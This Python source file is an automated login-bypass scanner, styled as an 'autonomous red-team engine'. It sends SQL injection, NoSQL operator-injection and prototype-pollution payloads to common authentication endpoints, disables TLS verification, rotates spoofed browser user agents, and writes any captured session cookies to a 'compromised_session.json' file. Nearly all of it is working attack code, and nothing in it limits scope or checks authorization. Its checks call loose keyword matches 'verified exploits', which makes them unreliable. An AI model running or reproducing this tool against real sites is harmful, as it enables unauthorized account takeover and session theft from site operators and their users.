import asyncio
import socket
import ssl
import time
import sys
import json
import os
import urllib.parse
import http.client
import random

# Initialize strict non-verifying SSL context for target testing
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

def verify_cryptographic_and_auth_proof(status, headers, body, target_endpoint):
    """
    Rigorously verifies whether an endpoint response represents a genuine 
    authentication bypass, database error, or valid session privilege escalation.
    """
    body_lower = body.lower()
    
    # 1. Database Error-Based Verification (SQLi / NoSQLi)
    sql_errors = [
        "sql syntax", "syntax error", "unclosed quotation mark", 
        "pg_query()", "sqlite3.operationalerror", "mysql_fetch", 
        "unterminated string literal", "ORA-00933", "mongodb", "postgresql",
        "syntaxerror: unexpected", "pdoexception"
    ]
    for err in sql_errors:
        if err in body_lower:
            return True, f"TRUE_EXPLOIT_SQL_ERROR_{err.upper()}"

    # 2. Stateful Session / Token Hijack Verification
    set_cookie = headers.get("Set-Cookie", "")
    has_session_cookie = any(cookie_key in set_cookie.lower() for cookie_key in ["session", "token", "jwt", "auth", "connect.sid", "access_token"])
    
    if status in [200, 201, 302] and (has_session_cookie or "bearer" in body_lower):
        auth_indicators = ["dashboard", "welcome", "admin_panel", "account_settings", "portfolio", "success", "token", "user"]
        if any(ind in body_lower for ind in auth_indicators) and "invalid" not in body_lower and "unauthorized" not in body_lower:
            return True, "TRUE_EXPLOIT_SESSION_HIJACK_CONFIRMED"

    # 3. Prototype Pollution / Header Poisoning Verification
    if status in [200, 302, 500] and ("polluted" in body_lower or "admin" in body_lower or "root privilege" in body_lower):
        return True, "TRUE_EXPLOIT_STATE_MANIPULATION"

    return False, "FALSE_POSITIVE_REJECTION"

def _perform_sync_request(host, port, path, payload, use_ssl, method="POST"):
    """Synchronous transport worker executed safely inside thread executors with adaptive content types."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=6.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=6.0)
        
        # Test both JSON and Form encodings dynamically if payload is a dict
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": f"https://{host}{path}",
            "Connection": "close"
        }
        
        data = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        conn.request(method, path, data.encode("utf-8"), headers)
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode(errors="ignore")
        headers_dict = dict(resp.getheaders())
        conn.close()
        return status, headers_dict, body, None
    except Exception as e:
        return 0, {}, "", str(e)

async def test_endpoint_differential_async(host, port, path, payload, use_ssl):
    """Non-blocking asynchronous wrapper enforcing rigorous validation."""
    status, headers, body, err = await asyncio.to_thread(
        _perform_sync_request, host, port, path, payload, use_ssl
    )
    if err:
        return 0, {}, "", False, "TRANSPORT_ERROR"
    
    is_vuln, vuln_type = verify_cryptographic_and_auth_proof(status, headers, body, path)
    return status, headers, body, is_vuln, vuln_type

async def run_autonomous_engine(target_host, credentials_list=None, options=None):
    """
    Elite Autonomous Red-Team Engine: Dynamic multi-schema field mutation 
    and stateful response inspection.
    """
    try:
        resolved_ip = socket.gethostbyname(target_host)
        print(f"\n\033[96m[*] Resolving target domain: {target_host} -> {resolved_ip}\033[0m")
    except socket.gaierror:
        print(f"\n\033[91m[!] Fatal: Target resolution failed for '{target_host}'.\033[0m")
        return [], 0

    start_time = time.time()
    print(f"\n\033[95m[***] ENGAGING ADAPTIVE MUTATION RED-TEAM ENGINE [{target_host}] [***]\033[0m")
    
    target_paths = [
        "/api/auth/callback/credentials",
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/v1/users/login",
        "/api/login",
        "/login",
        "/signin",
        "/auth",
        "/api/v1/auth"
    ]
    
    # Advanced Multi-Schema Parameter Mutations (Handles custom input field naming conventions)
    base_payloads = [
        ("admin' OR '1'='1' --", "x"),
        ("admin' --", "password"),
        ({"$ne": None}, {"$ne": None}), # NoSQL Injection bypass
    ]
    
    # Generate schema permutations for keys (username vs email vs user vs login)
    payloads = []
    for u_val, p_val in base_payloads:
        for u_key in ["username", "email", "user", "login", "account"]:
            for p_key in ["password", "pass", "pwd", "secret"]:
                if isinstance(u_val, dict):
                    payloads.append({u_key: u_val, p_key: p_val})
                else:
                    payloads.append({u_key: u_val, p_key: p_val})
                    
    # Include Prototype Pollution payload
    payloads.append({"__proto__": {"isAdmin": True, "role": "admin"}, "username": "admin", "password": "x"})

    hits = []
    target_port = 443
    use_ssl = True

    print(f"[*] Dispatched {len(target_paths) * len(payloads)} multi-vector permutations across discovered schemas...")

    for path in target_paths:
        for payload in payloads:
            status, headers, body, is_vuln, vuln_type = await test_endpoint_differential_async(
                resolved_ip, target_port, path, payload, use_ssl
            )
            
            sys.stdout.write(f"\r\033[K\033[90m[PROBING] {path} | Code: {status}\033[0m")
            sys.stdout.flush()
            
            if is_vuln:
                hit_data = {
                    "type": vuln_type,
                    "endpoint": path,
                    "payload": payload,
                    "status": status,
                    "cookies": headers.get("Set-Cookie", ""),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                print(f"\n\033[92m[+++] VERIFIED EXPLOIT CONFIRMED! Type: {vuln_type} on {path} (Status: {status})\033[0m")
                hits.append(hit_data)
                
                os.makedirs("reports/sessions", exist_ok=True)
                with open("reports/sessions/compromised_session.json", "w") as f:
                    json.dump(hit_data, f, indent=4)
                
                return hits, time.time() - start_time

    duration = time.time() - start_time
    print(f"\n\033[33m[*] Autonomous validation concluded in {duration:.2f}s. Perimeter verified.\033[0m")
    return hits, duration
